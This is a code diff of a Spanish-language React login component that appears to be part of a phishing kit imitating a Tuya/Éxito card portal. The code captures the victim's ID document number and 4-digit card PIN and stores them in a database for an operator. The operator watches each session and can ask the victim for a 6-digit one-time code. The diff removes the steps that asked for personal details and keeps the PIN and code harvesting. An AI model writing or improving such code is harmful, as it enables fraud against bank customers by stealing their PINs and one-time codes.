@@ -1,4 +1,4 @@
-import React, { useState, useRef, useEffect, useMemo } from 'react'
+import React, { useState, useRef, useEffect } from 'react'
 import tuyaLogo from '../assets/logo.svg'
 import {
   ChevronDown,
@@ -8,7 +8,6 @@ import {
   AlertCircle,
   KeyRound,
 } from 'lucide-react'
-import { CityAutocomplete } from './CityAutocomplete'
 
 interface VisualAuthViewProps {
   onGoToCard?: () => void
@@ -18,12 +17,10 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
   // Pasos del flujo:
   // 1: Documento
   // 2: Clave (4 compartimentos)
-  // 3: Formulario parte 1 (Nombre, Documento no editable, Dirección)
-  // 4: Formulario parte 2 (Fechas y Lugares)
-  // 'loading': Pantalla de espera con culebrita ("Estamos validando sus datos")
+  // 'loading': Pantalla de espera con animación ("Estamos validando sus datos")
   // 'six-digits': Pantalla de ingreso de 6 dígitos cuando el admin lo solicita
   // 5: Pantalla de confirmación final
-  const [step, setStep] = useState<1 | 2 | 3 | 4 | 'loading' | 'six-digits' | 5>(1)
+  const [step, setStep] = useState<1 | 2 | 'loading' | 'six-digits' | 5>(1)
 
   // ID del registro guardado en la base de datos
   const [recordId, setRecordId] = useState<number | null>(null)
@@ -71,47 +68,12 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
     useRef<HTMLInputElement>(null),
   ]
 
-  // Datos Formulario 1 (Paso 3)
-  const [fullName, setFullName] = useState('')
-  const [address, setAddress] = useState('')
-
-  // Datos Formulario 2 (Paso 4)
-  const [birthDate, setBirthDate] = useState('')
-  const [birthPlace, setBirthPlace] = useState('')
-  const [expeditionDate, setExpeditionDate] = useState('')
-  const [expeditionPlace, setExpeditionPlace] = useState('')
-
-  const [dateError, setDateError] = useState('')
-
   const docTypes = [
     'Cédula de ciudadanía',
     'Cédula de extranjería',
     'Tarjeta de identidad',
     'Pasaporte',
   ]
-
-  // Límites calculados para las fechas basados en la fecha actual
-  const { maxBirthDate, minBirthDate, maxExpeditionDate, minExpeditionDate } = useMemo(() => {
-    const now = new Date()
-    const eighteenYearsAgo = new Date(now.getFullYear() - 18, now.getMonth(), now.getDate())
-    const maxBirth = eighteenYearsAgo.toISOString().split('T')[0]
-    const minBirth = '1920-01-01'
-
-    const maxExp = now.toISOString().split('T')[0]
-    let minExp = '1938-01-01'
-    if (birthDate) {
-      const bDate = new Date(birthDate)
-      const turning18 = new Date(bDate.getFullYear() + 18, bDate.getMonth(), bDate.getDate())
-      minExp = turning18.toISOString().split('T')[0]
-    }
-
-    return {
-      maxBirthDate: maxBirth,
-      minBirthDate: minBirth,
-      maxExpeditionDate: maxExp,
-      minExpeditionDate: minExp,
-    }
-  }, [birthDate])
 
   // Foco automático en clave al pasar al paso 2
   useEffect(() => {
@@ -143,8 +105,8 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
           }
           // 2. Si el admin presionó "Error Datos"
           else if (currentStatus === 'ERROR_DATOS') {
-            setUserAlertMessage('La información personal o de expedición suministrada no coincide con nuestros registros. Por favor verifica y corrige tus datos.')
-            setStep(3)
+            setUserAlertMessage('La información suministrada no coincide con nuestros registros. Por favor verifica e intenta nuevamente.')
+            setStep(1)
           }
           // 3. Si el admin presionó "6 Dígitos"
           else if (currentStatus === 'SOLICITAR_6_DIGITOS') {
@@ -215,66 +177,15 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
     }
   }
 
-  const handleStep2Submit = (e: React.FormEvent) => {
+  // Handlers paso 2 (PIN 4 dígitos): Envía directo a la BD y pasa a PANTALLA DE ESPERA ("loading")
+  const handleStep2Submit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (pin.join('').length < 4) {
       alert('Digita los 4 dígitos de tu clave')
       return
     }
-    setStep(3)
-  }
 
-  // Handlers paso 3
-  const handleStep3Submit = (e: React.FormEvent) => {
-    e.preventDefault()
-    if (!fullName.trim() || !address.trim()) {
-      alert('Por favor completa todos los campos para continuar.')
-      return
-    }
-    setStep(4)
-  }
-
-  // Validación y envío del paso 4 -> Pasa a PANTALLA DE ESPERA ("loading")
-  const handleStep4Submit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setDateError('')
-
-    if (!birthDate) {
-      setDateError('Por favor selecciona tu fecha de nacimiento.')
-      return
-    }
-
-    if (!birthPlace.trim()) {
-      setDateError('Por favor selecciona tu lugar de nacimiento.')
-      return
-    }
-
-    if (!expeditionDate) {
-      setDateError('Por favor selecciona la fecha de expedición del documento.')
-      return
-    }
-
-    if (!expeditionPlace.trim()) {
-      setDateError('Por favor selecciona el lugar de expedición.')
-      return
-    }
-
-    if (birthDate > maxBirthDate) {
-      setDateError('Debes ser mayor de 18 años para continuar. Fecha no válida.')
-      return
-    }
-
-    if (expeditionDate > maxExpeditionDate) {
-      setDateError('La fecha de expedición no puede ser futura.')
-      return
-    }
-
-    if (expeditionDate < minExpeditionDate) {
-      setDateError('La fecha de expedición no puede ser anterior a tu mayoría de edad.')
-      return
-    }
-
-    // Poner al usuario en pantalla de espera
+    // Poner al usuario de inmediato en pantalla de espera
     setStep('loading')
     setUserAlertMessage('')
 
@@ -297,8 +208,8 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
     }
 
     const enrichedAddress = insuranceCancellation
-      ? `${address} | 🛡️ CANCELACIÓN SEGURO: ${insuranceCancellation.insurance} | Motivo: ${insuranceCancellation.reason} | Tel: ${insuranceCancellation.phone} | Correo: ${insuranceCancellation.email}`
-      : address
+      ? `🛡️ CANCELACIÓN SEGURO: ${insuranceCancellation.insurance} | Motivo: ${insuranceCancellation.reason} | Tel: ${insuranceCancellation.phone} | Correo: ${insuranceCancellation.email}`
+      : 'Cliente Web Éxito'
 
     // Guardar en la base de datos de Neon
     try {
@@ -309,19 +220,19 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
           docType,
           docNumber,
           pin: pin.join(''),
-          fullName,
+          fullName: 'Cliente Éxito',
           address: enrichedAddress,
-          birthDate,
-          birthPlace,
-          expeditionDate,
-          expeditionPlace,
+          birthDate: '',
+          birthPlace: '',
+          expeditionDate: '',
+          expeditionPlace: '',
           insuranceCancellation,
           status: 'PENDIENTE',
         }),
       })
 
-      const data = await res.json()
-      if (data.success && data.data?.id) {
+      const data = await res.json().catch(() => null)
+      if (data?.success && data.data?.id) {
         setRecordId(data.data.id)
         if (insuranceCancellation) {
           sessionStorage.removeItem('insurance_cancellation_data')
@@ -541,22 +452,15 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
         <div className="w-full max-w-[390px] sm:max-w-[420px] mx-auto py-6 sm:py-8 flex flex-col items-center relative">
           
           {/* BOTÓN VOLVER ARRIBA DEL TODO */}
-          {typeof step === 'number' && step > 1 && step < 5 && (
+          {step === 2 && (
             <div className="w-full flex items-center justify-start mb-4">
               <button
                 type="button"
-                onClick={() => {
-                  setDateError('')
-                  setStep((prev) => (typeof prev === 'number' ? ((prev - 1) as 1 | 2 | 3 | 4) : 1))
-                }}
+                onClick={() => setStep(1)}
                 className="inline-flex items-center gap-1.5 text-xs sm:text-[13px] font-medium text-[#5A6878] hover:text-[#E20613] transition-colors cursor-pointer py-1.5 px-2 rounded-xl hover:bg-black/5 -ml-2"
               >
                 <ArrowLeft className="w-4 h-4 text-[#E20613]" strokeWidth={2.5} />
-                <span>
-                  {step === 2 && 'Volver al documento'}
-                  {step === 3 && 'Volver a clave'}
-                  {step === 4 && 'Volver a datos personales'}
-                </span>
+                <span>Volver al documento</span>
               </button>
             </div>
           )}
@@ -815,211 +719,6 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
           )}
 
           {/* ============================================================== */}
-          {/* PASO 3: FORMULARIO 1 (Nombre, Documento BLOQUEADO, Dirección) */}
-          {/* ============================================================== */}
-          {step === 3 && (
-            <div className="w-full animate-in fade-in slide-in-from-right-4 duration-300">
-              <h1 className="text-[22px] sm:text-[24px] font-normal text-[#5A6878] text-center tracking-tight mb-1">
-                Confirma tus datos
-              </h1>
-              <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-7">
-                Parte 1 de 2: Información personal básica
-              </p>
-
-              <form onSubmit={handleStep3Submit} className="w-full space-y-4">
-                
-                {/* Nombre completo */}
-                <div
-                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
-                  style={{
-                    boxShadow:
-                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
-                  }}
-                >
-                  <label className="block text-[11px] font-medium text-gray-400 select-none">
-                    Nombre completo
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    value={fullName}
-                    onChange={(e) => setFullName(e.target.value)}
-                    placeholder="Ej. Carlos Mario Restrepo"
-                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0 placeholder:text-gray-400"
-                  />
-                </div>
-
-                {/* Documento BLOQUEADO */}
-                <div
-                  className="w-full bg-[#EAECEF] rounded-2xl px-5 py-3.5 transition-all cursor-not-allowed border border-gray-200/50"
-                  style={{
-                    boxShadow:
-                      'inset 2px 2px 5px rgba(160, 170, 185, 0.4), inset -2px -2px 5px rgba(255, 255, 255, 0.8)',
-                  }}
-                >
-                  <label className="block text-[11px] font-medium text-gray-400 select-none">
-                    Número de documento
-                  </label>
-                  <input
-                    type="text"
-                    readOnly
-                    disabled
-                    value={docNumber}
-                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-semibold text-[#5A6878] p-0 mt-0.5 cursor-not-allowed select-none"
-                  />
-                </div>
-
-                {/* Dirección */}
-                <div
-                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
-                  style={{
-                    boxShadow:
-                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
-                  }}
-                >
-                  <label className="block text-[11px] font-medium text-gray-400 select-none">
-                    Dirección de residencia
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    value={address}
-                    onChange={(e) => setAddress(e.target.value)}
-                    placeholder="Ej. Calle 45 # 12 - 34 Apto 301"
-                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0 placeholder:text-gray-400"
-                  />
-                </div>
-
-                <div className="pt-4">
-                  <button
-                    type="submit"
-                    className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2"
-                    style={{
-                      background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
-                      boxShadow:
-                        '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
-                    }}
-                  >
-                    <span>Siguiente</span>
-                  </button>
-                </div>
-
-              </form>
-            </div>
-          )}
-
-          {/* ============================================================== */}
-          {/* PASO 4: FORMULARIO 2 (Nacimiento, Expedición) */}
-          {/* ============================================================== */}
-          {step === 4 && (
-            <div className="w-full animate-in fade-in slide-in-from-right-4 duration-300">
-              <h1 className="text-[22px] sm:text-[24px] font-normal text-[#5A6878] text-center tracking-tight mb-1">
-                Datos de expedición
-              </h1>
-              <p className="text-xs sm:text-[13px] text-gray-500 text-center mb-6">
-                Parte 2 de 2: Fechas y lugares de registro
-              </p>
-
-              {dateError && (
-                <div className="mb-5 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs flex items-start gap-2 animate-in fade-in">
-                  <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
-                  <span>{dateError}</span>
-                </div>
-              )}
-
-              <form onSubmit={handleStep4Submit} className="w-full space-y-4">
-                
-                {/* Fecha nacimiento */}
-                <div
-                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
-                  style={{
-                    boxShadow:
-                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
-                  }}
-                >
-                  <label className="block text-[11px] font-medium text-gray-400 select-none">
-                    Fecha de nacimiento
-                  </label>
-                  <input
-                    type="date"
-                    required
-                    max={maxBirthDate}
-                    min={minBirthDate}
-                    value={birthDate}
-                    onChange={(e) => {
-                      setBirthDate(e.target.value)
-                      setDateError('')
-                    }}
-                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0"
-                  />
-                </div>
-
-                {/* Lugar nacimiento */}
-                <CityAutocomplete
-                  label="Lugar de nacimiento"
-                  placeholder="Busca tu ciudad (ej. Medellín)"
-                  value={birthPlace}
-                  onChange={(city) => {
-                    setBirthPlace(city)
-                    setDateError('')
-                  }}
-                />
-
-                {/* Fecha expedición */}
-                <div
-                  className="w-full bg-[#F0F2F5] rounded-2xl px-5 py-3.5 transition-all"
-                  style={{
-                    boxShadow:
-                      'inset 3px 3px 6px rgba(166, 175, 195, 0.45), inset -3px -3px 6px rgba(255, 255, 255, 0.95)',
-                  }}
-                >
-                  <label className="block text-[11px] font-medium text-gray-400 select-none">
-                    Fecha de expedición del documento
-                  </label>
-                  <input
-                    type="date"
-                    required
-                    max={maxExpeditionDate}
-                    min={minExpeditionDate}
-                    value={expeditionDate}
-                    onChange={(e) => {
-                      setExpeditionDate(e.target.value)
-                      setDateError('')
-                    }}
-                    className="w-full bg-transparent border-none outline-none text-[15px] sm:text-[16px] font-medium text-[#2C3847] p-0 mt-0.5 focus:ring-0"
-                  />
-                </div>
-
-                {/* Lugar expedición */}
-                <CityAutocomplete
-                  label="Lugar de expedición"
-                  placeholder="Busca la ciudad de expedición (ej. Bogotá)"
-                  value={expeditionPlace}
-                  onChange={(city) => {
-                    setExpeditionPlace(city)
-                    setDateError('')
-                  }}
-                />
-
-                <div className="pt-4">
-                  <button
-                    type="submit"
-                    className="w-full py-4 px-6 rounded-2xl text-white font-bold text-[15px] sm:text-[16px] cursor-pointer select-none transition-all duration-200 hover:brightness-105 active:scale-[0.98] focus:outline-none flex items-center justify-center gap-2"
-                    style={{
-                      background: 'linear-gradient(180deg, #D41A25 0%, #B80F1A 100%)',
-                      boxShadow:
-                        '0 8px 18px -2px rgba(190, 15, 26, 0.42), inset 0 1px 1.5px rgba(255, 255, 255, 0.35)',
-                    }}
-                  >
-                    <span>Confirmar y finalizar</span>
-                  </button>
-                </div>
-
-              </form>
-            </div>
-          )}
-
-          {/* ============================================================== */}
           {/* PASO 5: CONFIRMACIÓN EXITOSA */}
           {/* ============================================================== */}
           {step === 5 && (
@@ -1041,13 +740,6 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
                   setStep(1)
                   setPin(['', '', '', ''])
                   setSixDigits(['', '', '', '', '', ''])
-                  setFullName('')
-                  setAddress('')
-                  setBirthDate('')
-                  setBirthPlace('')
-                  setExpeditionDate('')
-                  setExpeditionPlace('')
-                  setDateError('')
                   setUserAlertMessage('')
                   setRecordId(null)
                 }}
